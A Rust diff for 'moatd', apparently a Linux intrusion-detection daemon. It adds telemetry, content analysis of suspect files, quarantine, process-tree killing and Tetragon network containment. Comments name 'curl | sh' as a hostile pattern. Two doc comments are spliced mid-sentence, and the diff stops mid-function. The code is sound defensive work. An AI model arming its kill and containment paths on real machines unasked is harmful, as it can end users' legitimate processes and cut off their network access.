@@ -17,6 +17,7 @@ use crate::alert::{Alert, ExplainOption, UpdateLine};
 use crate::allowlist::{Allowlist, Candidate};
 use crate::baseline::{Baseline, Demotion, Learned, Observation};
 use crate::bundle::{self, AncestryRow};
+use crate::chain::{self, ChainStore};
 use crate::config::{severity_at_least, Config};
 use crate::context;
 use crate::digest;
@@ -41,6 +42,14 @@ use crate::util;
 /// signal on its own; moatd raises it to `high` when the process turns out to
 /// be inside a package install, which is the part the kernel could not decide.
 pub const SUSPICIOUS_PORT_EGRESS: &str = "moat-net-suspicious-port-egress";
+pub const HISTORY_TAMPER: &str = "moat-rootkit-history-tamper";
+
+/// The rules whose SUBJECT is moat's own directories. Everything else is cut
+/// off from them entirely (`is_own_store`).
+const SELF_WATCH_RULES: &[&str] = &[
+    "moat-rootkit-evidence-tamper",
+    "moat-rootkit-sensor-tamper",
+];
 
 pub static RELOAD: AtomicBool = AtomicBool::new(false);
 pub static SHUTDOWN: AtomicBool = AtomicBool::new(false);
@@ -79,6 +88,28 @@ pub struct Daemon {
     pub rules: Vec<Box<dyn UserRule>>,
     pub mode: String,
     pub homes: Vec<String>,
+    /// Btrfs subvolume roots, for turning a dentry-derived path back into the
+    /// path the user would recognise (`util::dentry_abs`).
+    pub subvols: Vec<(String, String)>,
+    /// Last throttle alert per cgroup, so a flood raises one alert an hour and
+    /// not one per dropped batch.
+    throttle_seen: std::collections::HashMap<String, u64>,
+    /// The heartbeat found in state.json at startup: when moat last knew it was
+    /// alive. 0 on a machine that has never run it.
+    last_heartbeat: u64,
+    /// When something last read `status`. The panel polls it, so this is
+    /// moatd's only evidence that a human could see an alert if one arrived.
+    last_watched: u64,
+    /// When the last "nobody is watching" alert went out.
+    last_unwatched_alert: u64,
+    /// Live correlation-driven containments (`contain.rs`).
+    pub contain: crate::contain::ContainStore,
+    /// Binaries the KERNEL should stop watching, per policy. See
+    /// `exclude_binary`.
+    pub kernel_exclusions: std::collections::BTreeMap<String, Vec<String>>,
+    /// Chains already decided on. A chain grows for up to an hour and
+    /// `note_chain` re-enters on every growth; one decision per chain.
+    killed_chains: std::collections::BTreeSet<String>,
     /// Template stems that failed to render, from the last `render-policies`.
     pub policies_failed: Vec<String>,
     pub started: u64,
@@ -114,6 +145,14 @@ pub struct Daemon {
     pub digest_last_sent: u64,
     /// Incident snapshots taken since start, for the log and for `status`.
     pub incidents_captured: u64,
+    /// What is *in* the files a high chain implicated (`content.rs`). Holds the
+    /// hourly budget and the sha256 cache, which is why it lives on the daemon
+    /// rather than being constructed per call: a fresh analyser every time
+    /// would be a fresh allowance every time.
+    pub content: crate::content::Analyzer,
+    /// Design 2b/3a: alerts sharing a process tree and crossing families are
+    /// one sequence. Bounded and self-pruning; see `chain.rs`.
+    pub chains: ChainStore,
     /// Policies armed for in-kernel enforcement individually, while the daemon
     /// as a whole stays in monitor mode.
     ///
@@ -137,6 +176,24 @@ pub struct Daemon {
     /// increments the suffix instead, so ids from one run are strictly
     /// increasing whatever the clock resolution.
     ids: ulid::Generator,
+
+    // --- telemetry ---------------------------------------------------------
+    /// `telemetry.jsonl`, opened only when at least one non-`alerts` class is
+    /// on. `None` costs one `Option` check per event and nothing else, which
+    /// matters: this sits on the exec path at 42 events a second.
+    pub telemetry: Option<crate::telemetry::TelemetryStore>,
+    /// Telemetry records written since start, for `status`.
+    pub telemetry_written: u64,
+    /// Telemetry events that reached the daemon and were dropped by the
+    /// create/modify ladder before anything was written.
+    pub telemetry_filtered: u64,
+}
+
+/// The key the noise guard counts on: the same (rule, actor, parent, dir)
+/// tuple the baseline uses, so "this shape is noisy" means the same thing in
+/// both places and a user reading either sees the same grouping.
+fn noise_tuple(f: &Finding) -> String {
+    crate::baseline::tuple_key(&f.rule, &f.proc.exe, &f.parent_exe(), &f.file_dir())
 }
 
 impl Daemon {
@@ -163,9 +220,16 @@ impl Daemon {
         let allowlist = Allowlist::load(&cfg.paths.allowlist_dir);
         let feeds = Feeds::load(&cfg.paths.feeds());
         let homes = util::human_homes(&cfg.paths.passwd);
+        let subvols = util::subvol_roots(Path::new("/proc/self/mounts"));
         let table = ProcTable::new(cfg.thresholds.ancestry_max, cfg.thresholds.process_prune_secs);
         let state = read_state(&cfg.paths.state_file());
         let mode = persisted_mode(&state).unwrap_or_else(|| cfg.mode.clone());
+        let contain_enabled = persisted_contain(&state).unwrap_or(cfg.contain.enabled);
+        let contain_kill = persisted_kill(&state).unwrap_or_else(|| cfg.contain.kill.clone());
+        let mut cfg = cfg;
+        cfg.contain.enabled = contain_enabled;
+        cfg.contain.kill = contain_kill;
+        let exclusions_at_start = read_exclusions(&cfg.paths.state_file());
         let now = util::unix_secs();
 
         let provenance = Classifier::new(
@@ -193,6 +257,22 @@ impl Daemon {
             now,
         );
 
+        let telemetry = open_telemetry(&cfg);
+        // The hourly content-analysis budget survives a restart, because a
+        // budget a restart refills is not a budget -- and the daemon is
+        // restartable by anything that can crash it.
+        let mut content = crate::content::Analyzer::new(crate::content::Limits {
+            max_bytes: cfg.content.max_bytes,
+            per_hour: cfg.content.per_hour,
+            deny_roots: vec![
+                cfg.paths.state_dir.to_string_lossy().into_owned(),
+                "/var/log/moat".to_string(),
+            ],
+        });
+        content.restore(
+            persisted_u64(&state, "content", "hour_start"),
+            persisted_u64(&state, "content", "used") as u32,
+        );
         let digest_enabled = persisted_digest_enabled(&state).unwrap_or(cfg.digest.enabled);
         let digest_last_sent = persisted_u64(&state, "digest_summary", "last_sent_unix");
 
@@ -207,6 +287,20 @@ impl Daemon {
             rules: crate::rules::all(),
             mode,
             homes,
+            subvols,
+            throttle_seen: std::collections::HashMap::new(),
+            last_heartbeat: state
+                .as_ref()
+                .and_then(|s| s.get("heartbeat"))
+                .and_then(|v| v.as_u64())
+                .unwrap_or(0),
+            last_watched: now,
+            last_unwatched_alert: 0,
+            kernel_exclusions: exclusions_at_start,
+            killed_chains: std::collections::BTreeSet::new(),
+            contain: crate::contain::ContainStore::from_state(
+                state.as_ref().and_then(|s| s.get("contain")),
+            ),
             policies_failed: Vec::new(),
             started: now,
             events_seen: 0,
@@ -223,8 +317,13 @@ impl Daemon {
             digest_enabled,
             digest_last_sent,
             incidents_captured: 0,
+            content,
+            chains: ChainStore::new(),
             ids: ulid::Generator::new(),
             enforcing_rules: persisted_enforcing_rules(&state),
+            telemetry,
+            telemetry_written: 0,
+            telemetry_filtered: 0,
         })
     }
 
@@ -238,9 +337,14 @@ impl Daemon {
             }
             Err(e) => log::warn!("reload: keeping old config: {}", e),
         }
+        // A class turned off in moat.toml stops being written on SIGHUP. The
+        // kernel side needs `moatd telemetry apply` (a policy load is not
+        // hot-reloadable), but the file must not keep growing in the meantime.
+        self.telemetry = open_telemetry(&self.cfg);
         self.policies = PolicySet::load(&self.cfg.paths.policies_dir);
         self.allowlist = Allowlist::load(&self.cfg.paths.allowlist_dir);
         self.homes = util::human_homes(&self.cfg.paths.passwd);
+        self.subvols = util::subvol_roots(Path::new("/proc/self/mounts"));
         self.provenance.set_homes(&self.homes);
         self.baseline.learning_days = self.cfg.baseline.learning_days;
         self.baseline.learn_min_days = self.cfg.baseline.learn_min_days;
@@ -268,10 +372,16 @@ impl Daemon {
         self.events_seen += 1;
         let now = util::unix_secs();
 
+        if let Some(t) = &ev.process_throttle {
+            self.note_throttle(t, now);
+            return;
+        }
+
         if let Some(exec) = &ev.process_exec {
             let Some(exec_id) = self.table.on_exec(exec) else {
                 return;
             };
+            self.note_exec_telemetry(exec, ev.time.as_deref());
             // Rarity learns from every exec, alert or not (LEARNING §1).
             self.record_exec_rarity(&exec_id, now);
             // So does the install receipt (LEARNING §3): what an install did is
@@ -283,6 +393,7 @@ impl Daemon {
         }
 
         if let Some(exit) = &ev.process_exit {
+            self.note_exit_telemetry(exit, ev.time.as_deref());
             if let Some(exec_id) = self.table.on_exit(exit, now) {
                 self.confirm_kill(&exec_id, exit.signal.as_deref());
                 // The root of a package subtree exiting is what closes a
@@ -310,10 +421,187 @@ impl Daemon {
             self.table
                 .resolve_fd_binary(&exec_id, hook.binprm_path().as_deref());
 
-            let mut findings = self.policy_finding(&hook, &exec_id, now).into_iter().collect::<Vec<_>>();
+            // THE TELEMETRY FORK. A `moat-telemetry-*` policy is a record, not
+            // a claim, and it must never reach rule evaluation: the file class
+            // alone posts ~19 events/s through the kernel filter during a
+            // package install (measured), and running each of those against
+            // every rule — each of which walks ancestry — is how a detection
+            // daemon melts. The process table is updated above, because
+            // ancestry is most of what makes a telemetry record worth keeping,
+            // and then we leave.
+            if crate::telemetry::is_telemetry_policy(hook.policy_name()) {
+                self.note_hook_telemetry(&hook, &exec_id, ev.time.as_deref(), now);
+                return;
+            }
+
+            // The kernel's own finding, UNLESS a userland rule owns this
+            // policy id.
+            //
+            // Both halves used to fire for the same event. `moat-net-first-
+            // contact`'s kernel policy deliberately posts every non-loopback
+            // connect and leaves the judgement to userspace -- the kernel
+            // cannot know which destinations this machine has met -- so
+            // `policy_finding` turned each one into an alert, and
+            // `run_rules_hook` added another when the destination really was
+            // new. The result was a rule documented as "reports a destination
+            // once and then never again" emitting on every connection: 11 of
+            // 14 in a ten-minute sample read `common`, one of them seen 1593
+            // times. That put `net` in nearly every process tree, which is
+            // what made `qualifies()` fire on ordinary package updates.
+            //
+            // A rule that filters in userspace owns its id outright. There is
+            // no case where both should speak.
+            let mut findings = if self.rule_owns(hook.policy_name()) {
+                Vec::new()
+            } else {
+                self.policy_finding(&hook, &exec_id, now).into_iter().collect::<Vec<_>>()
+            };
             findings.extend(self.run_rules_hook(&hook, &exec_id, now));
             self.emit_all(findings);
         }
+    }
+
+    // -------------------------------------------------------------- telemetry
+
+    pub fn flush_telemetry(&mut self) {
+        if let Some(s) = self.telemetry.as_mut() {
+            s.flush();
+        }
+    }
+
+    fn write_telemetry(&mut self, rec: &crate::telemetry::Record) {
+        let Some(store) = self.telemetry.as_mut() else {
+            return;
+        };
+        if let Err(e) = store.append(rec) {
+            log::warn!("telemetry: {}", e);
+            return;
+        }
+        self.telemetry_written += 1;
+    }
+
+    fn note_exec_telemetry(&mut self, exec: &crate::event::ExecEvent, time: Option<&str>) {
+        if !self.cfg.telemetry.process || self.telemetry.is_none() {
+            return;
+        }
+        let ts = util::normalize_ts(time.unwrap_or_default());
+        if let Some(r) = crate::telemetry::exec_record(&self.cfg.telemetry, exec, &ts) {
+            self.write_telemetry(&r);
+        }
+    }
+
+    fn note_exit_telemetry(&mut self, exit: &crate::event::ExitEvent, time: Option<&str>) {
+        if !self.cfg.telemetry.process || self.telemetry.is_none() {
+            return;
+        }
+        let ts = util::normalize_ts(time.unwrap_or_default());
+        if let Some(r) = crate::telemetry::exit_record(exit, &ts) {
+            self.write_telemetry(&r);
+        }
+    }
+
+    /// A `moat-telemetry-*` hook event. This is the second stage of the file
+    /// class's two-stage filter: the kernel decided the path was
+    /// executable-shaped, and here we decide whether it is a create worth
+    /// dropping or a modify worth keeping (`telemetry.rs`).
+    fn note_hook_telemetry(&mut self, hook: &HookHit, exec_id: &str, time: Option<&str>, now: u64) {
+        use crate::telemetry::{self as t, FileShape, FileVerdict};
+        if self.telemetry.is_none() {
+            return;
+        }
+        let ts = util::normalize_ts(time.unwrap_or_default());
+        let policy = hook.policy_name();
+
+        if policy == "moat-telemetry-network-connect" {
+            if !self.cfg.telemetry.network {
+                return;
+            }
+            if let Some(r) = t::network_record(hook, &self.table, exec_id, &ts) {
+                self.write_telemetry(&r);
+            }
+            return;
+        }
+
+        if !self.cfg.telemetry.file {
+            return;
+        }
+        let Some(path) = hook.file_path() else {
+            return;
+        };
+        let chmod = policy == "moat-telemetry-file-became-executable";
+        let verdict = if chmod {
+            FileVerdict::ChmodX
+        } else {
+            t::verdict_for(
+                Path::new(&path),
+                now,
+                self.cfg.telemetry.create_window_secs,
+            )
+        };
+        if t::is_quiet_create(&self.cfg.telemetry, verdict, &path) {
+            self.telemetry_filtered += 1;
+            return;
+        }
+
+        let p = Path::new(&path);
+        let meta = std::fs::metadata(p).ok();
+        let shape = if self.cfg.telemetry.file_suffixes.iter().any(|s| path.ends_with(s.as_str())) {
+            FileShape::Script
+        } else if t::looks_like_elf(p) {
+            FileShape::Elf
+        } else if chmod {
+            FileShape::Other
+        } else {
+            FileShape::Location
+        };
+        let bytes = meta.as_ref().map(|m| m.len());
+        // A hash of a file that is still being written is not a lie, it is a
+        // hash of what was on disk when the record was made; the record says
+        // so by carrying the size beside it.
+        let sha256 = bytes
+            .filter(|n| *n <= 32 * 1024 * 1024)
+            .and_then(|_| util::sha256_file(p).ok());
+        let body = self.capture_body(&path, bytes);
+
+        let r = t::file_record(
+            &path, verdict, shape, bytes, sha256, body, &self.table, exec_id, &ts,
+        );
+        self.write_telemetry(&r);
+    }
+
+    /// Opt-in body capture for a small script.
+    ///
+    /// This is the one thing in the telemetry classes that puts file *contents*
+    /// anywhere they can be shipped, so it inherits `evidence::is_secret_path`
+    /// wholesale — the same function that stops a credential being staged for
+    /// an AI — plus a size cap and a "must decode as text" test. A path that
+    /// looks like key material is never read at all, whatever the config says.
+    fn capture_body(&self, path: &str, bytes: Option<u64>) -> Option<String> {
+        if !self.cfg.telemetry.capture_body {
+            return None;
+        }
+        if crate::evidence::is_secret_path(path) {
+            return None;
+        }
+        // Staged evidence and quarantined files are copies of the accused
+        // artefact and may be the user's credentials. `moat-ship`'s Guard blanks
+        // their *paths* wherever they appear, but a captured body is a separate
+        // string it cannot recognise — so the refusal has to be here too, at the
+        // only place a body is ever read.
+        if path.ends_with(".suspect")
+            || Path::new(path).starts_with(&self.cfg.analysis.bundle_dir)
+            || Path::new(path).starts_with(self.cfg.paths.quarantine())
+        {
+            return None;
+        }
+        let n = bytes?;
+        if n == 0 || n > self.cfg.telemetry.capture_body_max_bytes {
+            return None;
+        }
+        let raw = std::fs::read(path).ok()?;
+        // Text only. A truncated ELF in a JSON string helps nobody and is a
+        // large amount of base64 on the wire for it.
+        String::from_utf8(raw).ok()
     }
 
     fn run_rules_exec(&mut self, exec: &crate::event::ExecEvent, exec_id: &str, now: u64) -> Vec<Finding> {
@@ -361,10 +649,7 @@ impl Daemon {
 
         if let Some(parent) = parent {
             let info = self.rarity.observe(
-                &Tuple::Parent {
-                    exe: exe.clone(),
-                    parent,
-                },
+                &Tuple::parent(&exe, &parent),
                 now,
             );
             // Bounded: the table is pruned, this map is not, so cap it.
@@ -376,13 +661,14 @@ impl Daemon {
         if let Some(root) = root {
             if root != exe {
                 self.rarity
-                    .observe(&Tuple::PkgChild { root, child: exe }, now);
+                    .observe(&Tuple::pkg_child(&root, &exe), now);
             }
         }
     }
 
     fn ctx(&self, now: u64) -> RuleCtx<'_> {
         RuleCtx {
+            rarity: &self.rarity,
             cfg: &self.cfg,
             table: &self.table,
             feeds: &self.feeds,
@@ -401,13 +687,840 @@ impl Daemon {
     /// `/sys/devices/system/cpu/online` — and an alert is a claim about what
     /// happened, so such an event becomes a `moat-x-sensor-mismatch` record
     /// instead of a false accusation.
+    /// Look at what is actually IN the files a high chain implicated.
+    ///
+    /// This is the whole trigger surface of `content.rs`, and it is deliberately
+    /// this small. moat is not an anti-virus: there is no scan on write, no scan
+    /// on exec, no timer. A file is read here only because the correlator
+    /// already concluded that a *sequence* of behaviour in one process tree was
+    /// worth escalating — the same conclusion that justifies a quarantine and a
+    /// kill, both of which are more drastic than reading the bytes.
+    ///
+    /// **Order matters: this runs before `quarantine_chain_artifacts`.**
+    /// Quarantine moves the file into `/var/lib/moat/quarantine`, which is
+    /// moat's own store and which `content.rs` refuses outright — so analysing
+    /// afterwards would find nothing at the original path and would be refused
+    /// at the new one. Analysing first also means the bundle describes the file
+    /// as it was when it acted, which is the thing under discussion.
+    ///
+    /// The findings never move a severity. They are appended to the alert as a
+    /// `content` update, which folds into `explain.evidence` for every reader
+    /// and into `bundle.md` for the agent. `chain::escalate` and `scoring.rs`
+    /// remain the only things that decide how loud anything is.
+    fn analyse_chain_artifacts(&mut self, c: &crate::chain::Chain) {
+        if !self.cfg.content.enabled {
+            return;
+        }
+        // The stall this pass can add to the event thread, bounded in one
+        // number. Measured on this machine: ~4.4 ms per MB, so four files at
+        // the 8 MiB cap is ~150 ms in the worst case that never happens, and
+        // ~20 ms in the case that does. The hourly budget bounds the hour; this
+        // bounds the burst, which is what a reader of the tail actually feels.
+        // `note_chain` re-enters as the chain grows and each alert is analysed
+        // once, so a wider chain is spread over several passes rather than
+        // skipped.
+        const MAX_FILES_PER_PASS: usize = 4;
+        let mut analysed = 0usize;
+        for step in c.steps.iter().filter(|s| s.is_trigger()) {
+            if analysed >= MAX_FILES_PER_PASS {
+                log::debug!(
+                    "chain {}: {} files analysed this pass; the rest wait for the next",
+                    c.id,
+                    analysed
+                );
+                break;
+            }
+            let Some(a) = self.find_alert(&step.alert) else { continue };
+            // An allowlisted step is the user saying the event is fine; a
+            // sequence is not a licence to go back on that, and `chain.rs`
+            // already applies the same rule to escalation.
+            if a.suppressed_by.is_some() {
+                continue;
+            }
+            // Analysed once. `note_chain` re-enters every time the chain grows,
+            // for up to an hour, and without this a five-step chain would read
+            // its files once per growth for the whole window.
+            //
+            // "Once" includes the passes that decided not to read anything: an
+            // alert whose files were skipped because the hourly budget was spent
+            // keeps that record rather than being retried on the next growth.
+            // Retrying is the version of this that re-reads a chain's files
+            // every few seconds for an hour as soon as the budget frees, and
+            // the record says plainly which of the two happened.
+            if !a.content.is_empty() {
+                continue;
+            }
+            // The two files a finding is about: the binary that acted, and the
+            // file it touched. `is_own_store` is checked here as well as inside
+            // the analyser -- the analyser is the authority, this is the guard
+            // that already exists and has already caught this project twice.
+            let mut targets: Vec<(&'static str, String)> = Vec::new();
+            if !a.process.exe.is_empty() && !self.is_own_store(&a.process.exe) {
+                targets.push(("actor", a.process.exe.clone()));
+            }
+            if let Some(f) = a.file.as_ref() {
+                if !f.path.is_empty() && f.path != a.process.exe && !self.is_own_store(&f.path) {
+                    targets.push(("target", f.path.clone()));
+                }
+            }
+            let mut found = Vec::new();
+            for (role, path) in targets.into_iter().take(MAX_FILES_PER_PASS - analysed) {
+                analysed += 1;
+                // Reuse the hash the incident snapshot already computed for
+                // this file rather than walking it again. When there is none,
+                // `Analyzer` hashes the buffer it has to read anyway.
+                let known = incident_sha(&a, &path);
+                found.push(
+                    self.content
+                        .analyse(&path, role, known.as_deref(), util::unix_secs()),
+                );
+            }
+            if found.is_empty() {
+                continue;
+            }
+            let value = Value::Array(found.iter().map(|f| f.to_json()).collect());
+            for f in &found {
+                match &f.skipped {
+                    Some(why) => log::info!("chain {}: not reading {}: {}", c.id, f.path, why),
+                    None => log::info!(
+                        "chain {}: {} is {}, {} bytes, entropy {:.2}, {} marker(s), {} network ref(s)",
+                        c.id,
+                        f.path,
+                        f.kind,
+                        f.bytes,
+                        f.entropy,
+                        f.markers.len(),
+                        f.urls.len() + f.hosts.len()
+                    ),
+                }
+            }
+            if let Err(e) = self.mark(&a.id, "content", value) {
+                log::error!("alert {}: content update: {}", a.id, e);
+            }
+        }
+    }
+
+    /// Move the artefacts a chain implicates out of the way.
+    ///
+    /// This replaces what was going to be a generated `Sigkill` policy for the
+    /// dropper's path. That idea did not survive review: the step's `exe` is
+    /// the caller before exec (`/usr/bin/python`), so the policy would have
+    /// meant "kill any python that execs anything, machine-wide"; and the
+    /// dropper's own path is a fresh random directory every run, so matching on
+    /// it would never fire twice.
+    ///
+    /// Quarantine gets at the same thing without a kernel policy and without
+    /// anything irreversible: the dropped binary and the persistence artefact
+    /// are moved aside, chmod 000, with a manifest recording where they came
+    /// from. Re-execution fails because the file is gone; `moatctl quarantine
+    /// --restore` puts it back if this was wrong.
+    fn quarantine_chain_artifacts(&mut self, c: &crate::chain::Chain) {
+        if !self.cfg.contain.enabled {
+            return;
+        }
+        let mut roots = self.homes.clone();
+        roots.extend(["/tmp".into(), "/var/tmp".into(), "/dev/shm".into()]);
+        let base = self.cfg.paths.quarantine();
+
+        for step in c.steps.iter().filter(|s| s.is_trigger()) {
+            // The families whose artefact IS the attack: something dropped and
+            // run, and something arranged to run again. A `net` step names no
+            // file worth moving, and an allowlisted step names one the user
+            // already said was fine.
+            if step.family != "exec" && step.family != "persist" {
+                continue;
+            }
+            let Some(a) = self.find_alert(&step.alert) else { continue };
+            if a.suppressed_by.is_some() || a.action_taken != "none" {
+                continue;
+            }
+            let Some(path) = a.file.as_ref().map(|f| f.path.clone()) else { continue };
+            if path.is_empty() || !util::under_any(&path, &roots) {
+                continue;
+            }
+            if crate::evidence::is_secret_path(&path) {
+                continue;
+            }
+            match crate::control::quarantine_file(&base, &a.id, &path, &a.rule, &a.title) {
+                Ok(dest) => {
+                    let _ = self.mark(&a.id, "action_taken", Value::from("quarantined"));
+                    log::warn!(
+                        "chain {}: quarantined {} -> {}",
+                        c.id,
+                        path,
+                        dest.display()
+                    );
+                }
+                Err(e) => log::error!("chain {}: quarantine {}: {}", c.id, path, e),
+            }
+        }
+    }
+
+    /// What a chain would have killed, and -- only in `kill` mode -- killing it.
+    ///
+    /// Runs on every `high` chain regardless of mode, because the whole point
+    /// of `log` is to gather the evidence that says whether the rules are safe
+    /// to act on. Nothing is signalled unless `[contain] kill = "kill"`.
+    fn maybe_kill_tree(&mut self, c: &crate::chain::Chain, now: u64) {
+        let mode = self.cfg.contain.kill.clone();
+        if mode == "off" {
+            return;
+        }
+        // One decision per chain. `note_chain` re-enters every time the chain
+        // grows, for up to an hour: without this, every later trigger in a high
+        // tree would be killed as it appeared -- for a build, the rest of the
+        // build.
+        if self.killed_chains.contains(&c.id) {
+            return;
+        }
+
+        // Facts from the alerts, not from the steps: a step carries no rarity,
+        // and rarity is what separates a build from a first run.
+        let mut facts: Vec<crate::contain::StepFact> = Vec::new();
+        let mut uid = 0u32;
+        for step in c.steps.iter().filter(|s| s.is_trigger()) {
+            let Some(a) = self.find_alert(&step.alert) else { continue };
+            if a.suppressed_by.is_some() {
+                continue;
+            }
+            uid = a.process.uid;
+            facts.push(crate::contain::StepFact {
+                family: a.family.clone(),
+                novel: matches!(a.rarity, crate::rarity::Rarity::FirstSeen | crate::rarity::Rarity::Rare),
+                pid: step.pid,
+            });
+        }
+        let families: Vec<String> = {
+            let mut f: Vec<String> = facts.iter().map(|x| x.family.clone()).collect();
+            f.sort_unstable();
+            f.dedup();
+            f
+        };
+        if let Err(why) = crate::contain::worth_killing_for(&c.severity, &facts) {
+            self.record_decision(&c.id, &c.severity, &families, "spared", &why, &[]);
+            // INFO, not DEBUG. The refusals are the whole point of `log` mode:
+            // the argument for ever moving to `kill` is a week of these that
+            // are all correct, and at debug level -- which nothing enables --
+            // "the gate declined" and "the gate never ran" were the same
+            // silence. Found live on 2026-09-05 with kill armed and a chain
+            // sitting right there unrefused and unkilled.
+            log::info!("chain {}: not killing -- {}", c.id, why);
+            return;
+        }
+
+        // Is the ancestor itself the actor? `node -e` and `curl | sh` put the
+        // malicious process at the root of its own tree.
+        let ancestor_families: std::collections::BTreeSet<&str> = facts
+            .iter()
+            .filter(|f| f.pid == c.ancestor.pid)
+            .map(|f| f.family.as_str())
+            .collect();
+        let spare_ancestor = ancestor_families.len() < 2;
+
+        let targets = crate::contain::tree_targets(&c.steps, c.ancestor.pid, spare_ancestor);
+        // A cap, so a gate that is still wrong costs one build and not a day.
+        const MAX_TARGETS: usize = 8;
+        let mut named: Vec<String> = Vec::new();
+        let mut doomed: Vec<u32> = Vec::new();
+        for t in targets.iter().take(MAX_TARGETS) {
+            if let Some(why) = crate::contain::refuse_to_kill(t.pid, uid) {
+                // Same reasoning: a spared process is a decision, and a
+                // decision nobody can see cannot be reviewed.
+                log::info!("chain {}: sparing pid {} ({})", c.id, t.pid, why);
+                continue;
+            }
+            named.push(format!("{} ({})", t.pid, t.exe));
+            doomed.push(t.pid);
+        }
+        if doomed.is_empty() {
+            return;
+        }
+        self.killed_chains.insert(c.id.clone());
+
+        if mode != "kill" {
+            log::warn!(
+                "WOULD HAVE KILLED {} for chain {} ({}): {}",
+                doomed.len(),
+                c.id,
+                c.severity,
+                named.join(", ")
+            );
+            self.record_decision(
+                &c.id,
+                &c.severity,
+                &families,
+                "would_have_killed",
+                "gate passed; kill mode is log",
+                &named,
+            );
+            return;
+        }
+
+        // Stop the whole set before killing any of it, or the first SIGKILL is
+        // a starting pistol for whatever the others fork.
+        for pid in &doomed {
+            unsafe { libc::kill(*pid as i32, libc::SIGSTOP) };
+        }
+        let mut killed = 0usize;
+        for pid in &doomed {
+            if unsafe { libc::kill(*pid as i32, libc::SIGKILL) } == 0 {
+                killed += 1;
+            }
+        }
+        log::warn!("killed {} process(es) for chain {}: {}", killed, c.id, named.join(", "));
+        self.record_decision(&c.id, &c.severity, &families, "killed", "gate passed", &named);
+        self.raise_protection_change(
+            &format!("end {} process(es) implicated in one sequence", killed),
+            "moat itself, from chain correlation",
+            named,
+        );
+    }
+
+    /// Refuse this sequence's connections, for a while, and nothing else.
+    ///
+    /// The kernel rule that would have caught this excludes RFC1918, because a
+    /// selector cannot tell the developer's own package registry from a C2 on
+    /// the same subnet. Userspace can: `moat-net-first-contact` has already
+    /// established that nothing on this machine had ever used that destination,
+    /// and `chain.rs` has established that it happened inside a sequence worth
+    /// interrupting for. So the decision is made here and the enforcement is
+    /// handed back to the kernel, scoped to one binary and one address.
+    fn maybe_contain(&mut self, c: &crate::chain::Chain, now: u64) {
+        if !self.cfg.contain.enabled {
+            return;
+        }
+        if crate::alert::severity_rank(&c.severity) < crate::alert::severity_rank("high") {
+            return;
+        }
+        if self.contain.is_contained(&c.id) {
+            return;
+        }
+
+        // Only from steps that TRIGGERED. A step the user allowlisted is in the
+        // story for context, and a sequence is not a licence to act on
+        // something they said was fine.
+        let mut members: std::collections::BTreeMap<String, (String, String)> =
+            std::collections::BTreeMap::new();
+        for step in c.steps.iter().filter(|s| s.is_trigger()) {
+            let Some(a) = self.find_alert(&step.alert) else {
+                continue;
+            };
+            if a.suppressed_by.is_some() {
+                continue;
+            }
+            let Some(net) = a.net.as_ref() else { continue };
+            if net.dst_ip.is_empty() {
+                continue;
+            }
+            members.insert(a.id.clone(), (a.process.exe.clone(), net.dst_ip.clone()));
+        }
+        let targets = crate::contain::targets(&members);
+        // A sequence with nothing outbound in it has nothing to contain. That
+        // is most of them, and it is not a failure.
+        // EVERY binary that reached out, and every destination it reached.
+        //
+        // This took `targets.into_iter().next()`, which for the 2026-09-05 lab
+        // chain contained `python` -- already exited -- and left the dropped
+        // `browser-helper` free to keep beaconing. Containing the process that
+        // has finished is not containment.
+        if targets.is_empty() {
+            return;
+        }
+        let mut exes: Vec<String> = Vec::new();
+        let mut dests: Vec<String> = Vec::new();
+        for (exe, ds) in targets {
+            // BOTH the path tetragon reported and the path it resolves to.
+            //
+            // `matchBinaries` matches the binary the kernel actually executed,
+            // not the name it was invoked by. Tetragon reported `/usr/bin/
+            // python` for the 2026-09-05 lab chain; `/usr/bin/python` is a
+            // symlink to `python3` to `python3.14`, so a containment naming
+            // the reported path loaded, armed, and matched nothing -- the
+            // policy was live in enforce mode with a match count of zero while
+            // the beacon went straight through it.
+            //
+            // Proven on this machine rather than reasoned about: a copy of
+            // curl under /tmp was refused EPERM to 1.1.1.1:80, and a symlink
+            // under /tmp pointing at that same binary outside /tmp reached the
+            // same address a second later.
+            //
+            // Both go in because `In` takes a list and neither is reliably the
+            // right one: an interpreter reached through a symlink needs the
+            // resolved path, and a binary moatd cannot resolve (deleted,
+            // replaced, or on a mount that is gone) still needs the reported
+            // one.
+            for name in crate::contain::binary_aliases(&exe) {
+                if !exes.contains(&name) {
+                    exes.push(name);
+                }
+            }
+            for d in ds {
+                if !dests.contains(&d) {
+                    dests.push(d);
+                }
+            }
+        }
+
+        // Pick the slot BEFORE writing anything: `tp add` fails if a policy
+        // of that name is already loaded, so an occupied slot has to be
+        // released first rather than discovered half way through.
+        let slot = self.contain_slot_for(&c.id);
+        let policy = crate::contain::policy_name(slot);
+        let yaml = crate::contain::policy_yaml(
+            &policy,
+            &exes,
+            &dests,
+            &c.id,
+            self.cfg.contain.ttl_secs,
+        );
+        let path = self.cfg.paths.runtime_dir.join(format!("{}.yaml", policy));
+        if let Err(e) = std::fs::write(&path, yaml) {
+            log::error!("contain {}: {}", policy, e);
+            return;
+        }
+        if !self.tetra_policy(&["tp", "add", &path.to_string_lossy()]) {
+            let _ = std::fs::remove_file(&path);
+            return;
+        }
+
+        let record = crate::contain::Containment {
+            chain: c.id.clone(),
+            policy,
+            exes: exes.clone(),
+            dests: dests.clone(),
+            since: now,
+            expires: now + self.cfg.contain.ttl_secs,
+        };
+        log::warn!(
+            "contained {}: {:?} may not reach {:?} for {}s (chain {})",
+            record.policy,
+            exes,
+            dests,
+            self.cfg.contain.ttl_secs,
+            c.id
+        );
+        for dropped in self.contain.insert(record, self.cfg.contain.max) {
+            self.release_contain(&dropped);
+        }
+        self.write_state();
+    }
+
+    /// Delete a containment's policy. Best effort by design: a policy that is
+    /// Write one kill-gate decision to moat's own store.
+    ///
+    /// The refusals are the evidence for whether this gate can ever be
+    /// trusted, and until 2026-09-05 they existed only as journald lines --
+    /// which is not a record. journald is sized by a percentage of the disk,
+    /// evicts oldest-first, is not in the support bundle, and cannot be
+    /// queried by moat at all. "Run in log mode for a week and review it" is
+    /// not a plan you can carry out against a log that may not keep a week.
+    ///
+    /// Its own file rather than a line kind in `alerts.jsonl`, because that
+    /// file now rotates at 4 MiB with one generation kept, and a busy day of
+    /// alerts would evict the handful of lines that matter most. These are
+    /// small and rare: 1 MiB holds thousands, which is many months.
+    fn record_decision(
+        &mut self,
+        chain: &str,
+        severity: &str,
+        families: &[String],
+        verdict: &str,
+        reason: &str,
+        targets: &[String],
+    ) {
+        let line = serde_json::json!({
